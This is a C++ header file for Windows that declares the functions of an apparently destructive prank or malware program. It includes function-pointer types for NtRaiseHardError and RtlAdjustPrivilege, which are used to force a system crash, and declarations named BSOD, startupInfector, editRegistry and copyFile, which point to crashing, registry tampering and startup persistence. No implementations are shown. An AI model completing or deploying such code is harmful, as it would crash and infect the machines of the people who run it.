#pragma once

#include <windows.h>
#include <iostream>
#include <tchar.h> 
#include <filesystem>
#include <sysinfoapi.h>
#include <strsafe.h>
#include <Lmcons.h>
#include <math.h>

#define _USE_MATH_DEFINES 1

using namespace std;
using std::filesystem::current_path;

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void BSOD();
int setRegestryValue(string Location, string Name, string Type, string Data);
void pouVitalsCheck();
void startupInfector(string file, string newName);

int editRegistry();
int setRegValue(LPCTSTR LOCATION);
string username();
int copyFile(string file, string destination, string fileName);
int getNumOfWindows();




void RussianGdi();

void RussianManCool();

void Russ();